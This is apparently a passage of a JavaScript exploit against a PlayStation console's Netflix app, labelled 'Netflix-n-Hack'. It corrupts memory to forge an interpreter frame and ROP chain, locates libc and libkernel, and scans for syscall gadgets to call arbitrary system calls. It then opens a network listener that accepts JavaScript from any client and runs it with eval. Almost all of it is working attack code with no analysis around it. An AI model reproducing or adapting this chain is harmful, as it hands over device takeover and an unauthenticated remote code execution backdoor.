        logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
        add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
        add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
        add_rop_smash_code_store = add_rop_smash_code + 0x22n;        

        logger.log("Address of fake_frame: 0x" + hex(base_heap_add + fake_frame) );
        logger.log("Address of fake_bytecode: " + hex(base_heap_add + fake_bytecode) );
        logger.log("Address of fake_rop_return: " + hex(base_heap_add + fake_rop_return) );
        
        write8(fake_bytecode + 0x00n, 0xABn);
        write8(fake_bytecode + 0x17n, 0x00n); // Here is the value of RBX , force 0

        /*
        Address	    Instruction
        734217FB	jmp 0x73421789
        734217FD	mov rbx, qword ptr [rbp - 0x20] --> Fake Bytecode buffer on rbx
        73421801	mov ebx, dword ptr [rbx + 0x17] --> Fake Bytecode buffer + 0x17 (part of fake_bytecode[2])
        73421804	mov rcx, qword ptr [rbp - 0x18] --> Value forced to 0xff00000000000000
        73421808	lea rcx, [rcx*8 + 8]
        73421810	cmp rbx, rcx
        73421813	jge 0x73421818                  --> Because of forced value, it jumps right to the leave
        73421815	mov rbx, rcx
        73421818	leave
        73421819	pop rcx
        7342181A	add rsp, rbx                    --> RBX should be 0 here
        7342181D	push rcx
        7342181E	ret
        */

        write64(fake_frame  - 0x20n, base_heap_add + fake_bytecode);  // Put the return code (by pointer) in R14
                                                                    // this is gonna be offseted by R9
        write64(fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
        write64(fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
                                                                          
        write64(fake_frame + 0x08n, eboot_base + g.pop_rsp); // pop rsp ; ret --> this change the stack pointer to your stack
        write64(fake_frame + 0x10n, rop_address);
        
        function analyzeBytecode(func, funcName = "function") {
            let func_add = addrof(func);
            let sfi_add = (read64(func_add + 0x0Cn) & 0xffffffffn) - 1n;
            let bc_st_add = (read64(sfi_add + 0x04n) & 0xffffffffn) - 1n;
            let bc_array_add = bc_st_add + 0x22n;
            
            logger.log("Function '" + funcName + "' Add: " + hex(func_add));
            logger.log("SFI '" + funcName + "' Add: " + hex(sfi_add));
            logger.log("Bytecode Store '" + funcName + "' Add: " + hex(bc_st_add));
            logger.log("Bytecode array '" + funcName + "' Add: " + hex(bc_array_add));
            
            for(var i = 0n; i < 8n; i++) {
                logger.log(funcName + " bytecode[" + i + "] : " + (read64(bc_array_add + i) & 0xffn).toString(16).padStart(2, '0'));
            }
            
            return {
                func_add: func_add,
                sfi_add: sfi_add,
                bc_st_add: bc_st_add,
                bc_array_add: bc_array_add
            };
        }
        
        
        // This function is calling a given function address and takes all arguments
        // Returns the value returned by the called function
        function call_rop (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            
            write64(add_rop_smash_code_store, 0xab0025n);
            
            real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n; // We only leak lower 32bits, stack seems always be at upper 32bits 0x7
                                                                    // Value is tagged, remove 1n
                                                                    // Seems offseted by 2 bytes
            
            let i = 0;
            // Syscall Number (Syscall Wrapper)
            fake_rop[i++] = eboot_base + g.pop_rax;
            fake_rop[i++] = rax;

            // Arguments
            fake_rop[i++] = eboot_base + g.pop_rdi;
            fake_rop[i++] = arg1;
            fake_rop[i++] = eboot_base + g.pop_rsi;
            fake_rop[i++] = arg2;
            fake_rop[i++] = eboot_base + g.pop_rdx;
            fake_rop[i++] = arg3;
            fake_rop[i++] = eboot_base + g.pop_rcx;
            fake_rop[i++] = arg4;
            fake_rop[i++] = eboot_base + g.pop_r8;
            fake_rop[i++] = arg5;
            fake_rop[i++] = eboot_base + g.pop_r9;
            fake_rop[i++] = arg6;

            // Call Syscall Wrapper / Function
            fake_rop[i++] = address;

            // Store return value to fake_rop_return
            
            if(is_ps4){
                fake_rop[i++] = eboot_base + g.pop_rsi;
                fake_rop[i++] = base_heap_add + fake_rop_return;
                fake_rop[i++] = eboot_base + g.mov_qword_ptr_rsi_rax;
            }
            else {
                            // Store return value to fake_rop_return
                fake_rop[i++] = eboot_base + g.pop_rdi;
                fake_rop[i++] = base_heap_add + fake_rop_return;
                fake_rop[i++] = eboot_base + g.mov_qword_ptr_rdi_rax;
                
            }

            // Return to JS
            fake_rop[i++] = eboot_base + g.pop_rax;
            fake_rop[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
            fake_rop[i++] = eboot_base + g.pop_rsp_pop_rbp;
            fake_rop[i++] = real_rbp;
            
            write64(add_rop_smash_code_store, 0xab00260325n); //25 03 26 00 AB <---------crash here (privelege instruction fault)
            oob_arr[39] = base_heap_add + fake_frame;
            rop_smash(obj_arr[0]);    //<---- crash here      // Call ROP

            //return BigInt(return_value_buffer[0]); // Return value returned by function
            // Seems like this is not being executed
        }

        function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
            return read64(fake_rop_return);
        }
        libc_base = read64_uncompressed(eboot_base + 0x26AB7D8n) - 0x309F0n; // Global for payloads 267e010

        if(is_us){
            libc_base = read64_uncompressed(eboot_base + 0x26AA010n) - 0x309A0n;
        }

        logger.log("libc base : " + hex(libc_base));

        // longjmp and setjmp addresses from eboot GOT (global for payloads)
        if (is_us) {
            longjmp_addr = read64_uncompressed(eboot_base + 0x26aacd0n); // or 0x26aacd0n 
            setjmp_addr = read64_uncompressed(eboot_base + 0x26aacc8n);
        } else {
            longjmp_addr = read64_uncompressed(eboot_base + 0x26ac490n);
            setjmp_addr = read64_uncompressed(eboot_base + 0x26ac488n);
        }
        logger.log("setjmp @ " + hex(setjmp_addr));
        logger.log("longjmp @ " + hex(longjmp_addr));
        const gettimeofdayAddr = read64_uncompressed(libc_base + 0x001179A8n);
        logger.log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
        const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x117910n);
        logger.log("sceKernelGetModuleInfoFromAddr: " + hex(sceKernelGetModuleInfoFromAddr));
  
        /***** Get libkernel base (needed before we can scan for syscalls) *****/
        const mod_info = malloc(0x300);
        const SEGMENTS_OFFSET = 0x160n;

        ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
        logger.log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));

        if (ret !== 0x0n) {
            logger.log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
            throw new Error("sceKernelGetModuleInfoFromAddr failed");
        }

        /***** LibKernel *****/
        libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
        logger.log("libkernel_base @ " + hex(libkernel_base));
        logger.flush();

        /***** Scan libkernel for syscall gadgets (PS4-specific) *****/
        logger.log("Scanning libkernel for syscall gadgets...");
        logger.flush();

        // Pattern: mov rax, imm32; mov r10, rcx; syscall
        const SYSCALL_PATTERN = [
            0x48, 0xC7, 0xC0, null, null, null, null,  // mov rax, imm32
            0x49, 0x89, 0xCA,                           // mov r10, rcx
            0x0F, 0x05                                  // syscall
        ];

        // syscall_gadget_table is a global variable
        const scan_size = 0x40000; // 256KB
        const chunk_size = 0x4000; // 16KB chunks
        const num_chunks = Math.floor(scan_size / chunk_size);
        let matches_found = 0;

        for (let chunk = 0; chunk < num_chunks; chunk++) {
            const offset = BigInt(chunk * chunk_size);
            const chunk_addr = libkernel_base + offset;

            for (let i = 0; i < chunk_size - SYSCALL_PATTERN.length; i++) {
                const addr = chunk_addr + BigInt(i);
                let match = true;

                for (let p = 0; p < SYSCALL_PATTERN.length; p++) {
                    const expected = SYSCALL_PATTERN[p];
                    if (expected !== null) {
                        try {
                            const byte = read8_uncompressed(addr + BigInt(p));
                            if (Number(byte) !== expected) {
                                match = false;
                                break;
                            }
                        } catch (e) {
                            match = false;
                            break;
                        }
                    }
                }

                if (match) {
                    try {
                        const syscall_num = Number(read32_uncompressed(addr + 3n));
                        if (!syscall_gadget_table[syscall_num]) {
                            syscall_gadget_table[syscall_num] = addr;
                            matches_found++;
                        }
                    } catch (e) {
                        // Skip
                    }
                }
            }
        }

        logger.log("Found " + matches_found + " syscall gadgets");
        logger.flush();

        // Find a "syscall; ret" gadget for use as syscall_wrapper
        // Check if any of our found gadgets has a 'ret' (0xC3) after the syscall
        syscall_wrapper = undefined;
        for (let num in syscall_gadget_table) {
            if (syscall_gadget_table[num]) {
                const gadget_addr = syscall_gadget_table[num];
                const syscall_offset = 10n; // Offset of "syscall" in pattern
                try {
                    // Check what comes after "syscall" (0x0F 0x05)
                    const byte_after = read8_uncompressed(gadget_addr + syscall_offset + 2n);
                    if (Number(byte_after) === 0xC3) { // ret instruction
                        syscall_wrapper = gadget_addr + syscall_offset; // "syscall; ret"
                        logger.log("Found syscall; ret gadget @ " + hex(syscall_wrapper));
                        break;
                    }
                } catch (e) {
                    // Skip
                }
            }
        }

        // If no "syscall; ret" found, try to find standalone "syscall; ret" pattern
        if (!syscall_wrapper) {
            logger.log("Searching for standalone syscall; ret pattern...");
            const SYSCALL_RET_PATTERN = [0x0F, 0x05, 0xC3]; // syscall; ret

            for (let chunk = 0; chunk < num_chunks; chunk++) {
                const offset = BigInt(chunk * chunk_size);
                const chunk_addr = libkernel_base + offset;

                for (let i = 0; i < chunk_size - 3; i++) {
                    const addr = chunk_addr + BigInt(i);
                    let match = true;

                    for (let p = 0; p < SYSCALL_RET_PATTERN.length; p++) {
                        try {
                            const byte = read8_uncompressed(addr + BigInt(p));
                            if (Number(byte) !== SYSCALL_RET_PATTERN[p]) {
                                match = false;
                                break;
                            }
                        } catch (e) {
                            match = false;
                            break;
                        }
                    }

                    if (match) {
                        syscall_wrapper = addr;
                        logger.log("Found standalone syscall; ret @ " + hex(syscall_wrapper));
                        break;
                    }
                }
                if (syscall_wrapper) break;
            }
        }

        if (!syscall_wrapper) {
            logger.log("ERROR: No syscall; ret gadget found!");
            logger.flush();
            throw new Error("Failed to find syscall wrapper");
        }
        logger.log("syscall_wrapper @ " + hex(syscall_wrapper));
        logger.flush();

        /***** Syscall function using direct gadgets *****/
        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            const num = Number(syscall_num);
            const gadget = syscall_gadget_table[num];

            if (!gadget) {
                logger.log("ERROR: No gadget for syscall " + num);
                return 0xffffffffffffffffn;
            }

            call_rop(gadget, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
            return read64(fake_rop_return);
        }
        
        let SYSCALL = {
            read: 0x3n,
            write: 0x4n,
            open: 0x5n,
            close: 0x6n,
            getuid: 0x18n,
            getsockname: 0x20n,
            accept: 0x1en,
            socket: 0x61n,
            connect: 0x62n,
            bind: 0x68n,
            setsockopt: 0x69n,
            listen: 0x6an,
            getsockopt: 0x76n,
            sysctl: 0xcan,
            netgetiflist: 0x7dn,
        };

        const O_RDONLY = 0n;
        const O_WRONLY = 1n;
        const O_RDWR = 2n;
        const O_CREAT = 0x100n;
        const O_TRUNC = 0x1000n;
        const O_APPEND = 0x2000n;
        const O_NONBLOCK = 0x4000n;

        const AF_INET = 2n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const SOCK_DGRAM = 2n;
        const IPPROTO_UDP = 17n;
        const IPPROTO_IPV6 = 41n;
        const IPV6_PKTINFO = 46n;
        const INADDR_ANY = 0n;

        const SOL_SOCKET = 0xffffn;
        const SO_REUSEADDR = 4n;

        function write_string(addr, str) {            
            let bytes = stringToBytes(str);
            for (let i = 0; i < str.length; i++) {
                write8_uncompressed(addr + BigInt(i), bytes[i]);
            }
            
            write8_uncompressed(addr + BigInt(str.length), 0);
        }

        function alloc_string(str) {
            const addr = malloc(str.length + 1); // Full 64bits Add
            let bytes = stringToBytes(str);
            for (let i = 0; i < str.length; i++) {
                write8_uncompressed(addr + BigInt(i), bytes[i]);
            }
            
            write8_uncompressed(addr + BigInt(str.length), 0);
            
            return addr;
        }

        function send_notification(text) {
            const notify_buffer_size = 0xc30n;
            const notify_buffer = malloc(Number(notify_buffer_size));
            const icon_uri = "cxml://psnotification/tex_icon_system";
                                
            // Setup notification structure
            write32_uncompressed(notify_buffer + 0x0n, 0);           // type
            write32_uncompressed(notify_buffer + 0x28n, 0);          // unk3
            write32_uncompressed(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
            write32_uncompressed(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
            
            // Write message at offset 0x2D
            write_string(notify_buffer + 0x2dn, text);
            
            // Write icon URI at offset 0x42D
            write_string(notify_buffer + 0x42dn, icon_uri);
            
            // Open /dev/notification0
            const dev_path = alloc_string("/dev/notification0");
            const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
            
            if (Number(fd) < 0) {
                return;
            }
            
            syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
            syscall(SYSCALL.close, fd);  
        }

        send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");


        /***** Let's receive JS payloads *****/

        const MAXSIZE = 500 * 1024;

        const sockaddr_in = malloc(16);
        const addrlen = malloc(8);
        const enable = malloc(4);
        const len_ptr = malloc(8);
        const payload_buf = malloc(MAXSIZE);
        let sock_fd = null;
        let port = 0;

        function create_socket() {
            // Clear sockaddr
            for (let i = 0; i < 16; i++) write8_uncompressed(sockaddr_in + BigInt(i), 0);

            const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
            if (sock_fd === 0xffffffffffffffffn) {
                throw new Error("Socket creation failed: " + hex(sock_fd));
            }

            write32_uncompressed(enable, 1);
            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);

            write8_uncompressed(sockaddr_in + 1n, AF_INET);
            write16_uncompressed(sockaddr_in + 2n, 0);        // port 0
            write32_uncompressed(sockaddr_in + 4n, 0);        // INADDR_ANY

            const bind_ret = syscall(SYSCALL.bind, sock_fd, sockaddr_in, 16n);
            if (bind_ret === 0xffffffffffffffffn) {
                syscall(SYSCALL.close, sock_fd);
                throw new Error("Bind failed: " + hex(bind_ret));
            }

            const listen_ret = syscall(SYSCALL.listen, sock_fd, 3n);
            if (listen_ret === 0xffffffffffffffffn) {
                syscall(SYSCALL.close, sock_fd);
                throw new Error("Listen failed: " + hex(listen_ret));
            }

            return sock_fd;
        }

        function get_port(sock_fd) {
            write32_uncompressed(len_ptr, 16);
            syscall(SYSCALL.getsockname, sock_fd, sockaddr_in, len_ptr);

            const port_be = read16_uncompressed(sockaddr_in + 2n);
            return Number(((port_be & 0xFFn) << 8n) | ((port_be >> 8n) & 0xFFn));
        }

        function get_current_ip() {
            // Get interface count
            const count = Number(syscall(SYSCALL.netgetiflist, 0n, 10n));
            if (count < 0) {
                return null;
            }
            
            // Allocate buffer for interfaces
            const iface_size = 0x1e0;
            const iface_buf = malloc(iface_size * count);
            
            // Get interface list
            if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
                return null;
            }
            
            // Parse interfaces
            for (let i = 0; i < count; i++) {
                const offset = BigInt(i * iface_size);
                
                // Read interface name (null-terminated string at offset 0)
                let iface_name = "";
                for (let j = 0; j < 16; j++) {
                    const c = Number(read8_uncompressed(iface_buf + offset + BigInt(j)));
                    if (c === 0) break;
                    iface_name += String.fromCharCode(c);
                }
                
                // Read IP address (4 bytes at offset 0x28)
                const ip_offset = offset + 0x28n;
                const ip1 = Number(read8_uncompressed(iface_buf + ip_offset));
                const ip2 = Number(read8_uncompressed(iface_buf + ip_offset + 1n));
                const ip3 = Number(read8_uncompressed(iface_buf + ip_offset + 2n));
                const ip4 = Number(read8_uncompressed(iface_buf + ip_offset + 3n));
                const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
                
                // Check if this is eth0 or wlan0 with valid IP
                if ((iface_name === "eth0" || iface_name === "wlan0") && 
                    iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
                    return iface_ip;
                }
            }
            
            return null;
        }
        
        let attemp = 0;

        do {
            main_sock_fd = create_socket();
            main_port = get_port(main_sock_fd);
            if(main_port == 60000)
                break;

            syscall(SYSCALL.close, main_sock_fd);
            attemp++;

        } while (attemp <= 50000);

        if(attemp == 50000) {
            logger.log("Could not get port 60000 after 50000 attemps");
        }

        sock_fd = create_socket();
        port = get_port(sock_fd);
        const current_ip = get_current_ip();

        if (current_ip === null) {
            send_notification("No network available!\nAborting...");
            throw new Error("No network available!\nAborting...");
        }

        let network_str = current_ip + ":" + port;
        logger.log("Remote JS Loader listening on " + network_str);
        send_notification("Remote JS Loader\nListening on " + network_str);
        logger.flush(); // Force display before entering async loop

        // Async socket accept loop - allows logger to stay responsive
        (async () => {
            while (true) {
                try {
                    logger.log("Awaiting connection at " + network_str);
                    logger.flush();

                    // Yield to event loop before blocking accept() call
                    await new Promise(resolve => nrdp.setTimeout(resolve, 10));

                    write32_uncompressed(addrlen, 16);
                    const client_fd = syscall(SYSCALL.accept, sock_fd, sockaddr_in, addrlen);

                if (client_fd === 0xffffffffffffffffn) {
                    logger.log("accept() failed: " + hex(client_fd) + " - recreating socket");
                    syscall(SYSCALL.close, sock_fd);

                    const recreated = recreate_socket();
                    sock_fd = recreated.sock_fd;
                    port = recreated.port;
                    network_str = recreated.network_str;
                    continue;
                }

                logger.log("Client connected, fd: " + Number(client_fd));
                logger.flush();

                let total_read = 0;
                let read_error = false;

                while (total_read < MAXSIZE) {
                    const bytes_read = syscall(
                        SYSCALL.read,
                        client_fd,
                        payload_buf + BigInt(total_read),
                        BigInt(MAXSIZE - total_read)
                    );

                    const n = Number(bytes_read);

                    if (n === 0) break;
                    if (n < 0) {
                        logger.log("read() error: " + n);
                        read_error = true;
                        break;
                    }

                    total_read += n;
                    logger.log("Read " + n + " bytes");
                }

                logger.log("Finished reading, total=" + total_read + " error=" + read_error);

                if (read_error || total_read === 0) {
                    logger.log("No valid data received");
                    syscall(SYSCALL.close, client_fd);
                    continue;
                }

                const bytes = new Uint8Array(total_read);
                for (let i = 0; i < total_read; i++) {
                    let read = read8_uncompressed(payload_buf + BigInt(i));
                    bytes[i] = Number(read);
                }

                // Convert bytes to string in chunks to avoid stack overflow
                let js_code = '';
                const CHUNK_SIZE = 8192;
                for (let i = 0; i < total_read; i += CHUNK_SIZE) {
                    const end = Math.min(i + CHUNK_SIZE, total_read);
                    const chunk = bytes.slice(i, end);
                    js_code += String.fromCharCode.apply(null, chunk);
                }

                logger.log("Executing payload...");
                logger.flush();
                eval(js_code);
                logger.log("Executed successfully");
                logger.flush();

                syscall(SYSCALL.close, client_fd);
                logger.log("Connection closed");
                logger.flush();

            } catch (e) {
                logger.log("ERROR in accept loop: " + e.message);
                logger.log(e.stack);
                logger.flush();
            }
        }
        })(); // End of async socket accept loop

    } catch (e) {
        logger.log("EXCEPTION: " + e.message);
        logger.log(e.stack);
        logger.flush();
    }
}
    ws.init("192.168.0.111", 1337, main);// uncomment this to enable WebSocket logging
//main();

